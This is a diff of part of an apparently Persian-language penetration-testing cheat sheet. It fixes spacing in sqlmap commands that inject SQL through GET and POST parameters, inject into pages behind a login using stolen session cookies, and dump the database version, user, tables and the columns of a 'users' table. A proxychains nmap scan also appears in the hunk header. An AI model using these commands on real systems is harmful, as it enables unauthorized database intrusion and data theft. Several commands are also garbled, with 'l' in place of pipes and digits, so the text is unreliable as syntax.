@@ -432,48 +432,48 @@ proxychains nmap -sT -p80,443 3.3.3.3
 ### ارسال درخواست Get
 
 ```text
-sqlmap.py -u "http:// url ?id=1&str=val"
+sqlmap.py -u "http://url?id=1&str=val"
 ```
 
 ### ارسال درخواست Post
 
 ```text
-sqlmap.py -u "http:// url " --data="id=1&str=val"
+sqlmap.py -u "http://url" --data="id=1&str=val"
 ```
 
 ### تزریق sql در پارامتر خاص و دانستن نوع دیتابیس 
 
 ```text
-sqlmap.py -u "http:// url" --data="id=l&str=val" -p "id"
--b --dbms=" mssqllmysqlloraclelpostgres "
+sqlmap.py -u "http://url" --data="id=l&str=val" -p "id"
+-b --dbms="mssqllmysqlloraclelpostgres"
 ```
 
 ### تزریق sql در صفحه نیازمند احراز هویت 
 
 ```text
 1.Login and note cookie value (cookie1=val1, cookie2=val2)
-sqlmap.py -u "http:// url " --data="id=l&str=val" -p "id"
+sqlmap.py -u "http:// url "--data="id=l&str=val" -p "id"
 --cookie="cookiel=vall;cookie2=val2"
 ```
 
 ### تزریق sql و دریافت نسخه پایگاه داده و نام و کاربر آن 
 
 ```text
-./sqlmap.py -u "http:// url " --data="id=1&str=val" -p "id" -b --current-db
+./sqlmap.py -u "http://url" --data="id=1&str=val" -p "id" -b --current-db
 --current-user
 ```
 
 ### تزریق sql و دریافت جداول پایگاه داده db=testdb
 
 ```text
-sqlmap.py -u "http:// url " --data="id=1&str=val" -p "id" --tables -D
+sqlmap.py -u "http://url" --data="id=1&str=val" -p "id" --tables -D
 "testdb"
 ```
 
 ###  تزریق sql و دریافت ستون های جدول
 
 ```text
-sqlmap.py -u "http:// url " --data="id=l&str=val" -p "id" --columns -T
+sqlmap.py -u "http://url" --data="id=l&str=val" -p "id" --columns -T
 "users"
 ```
 
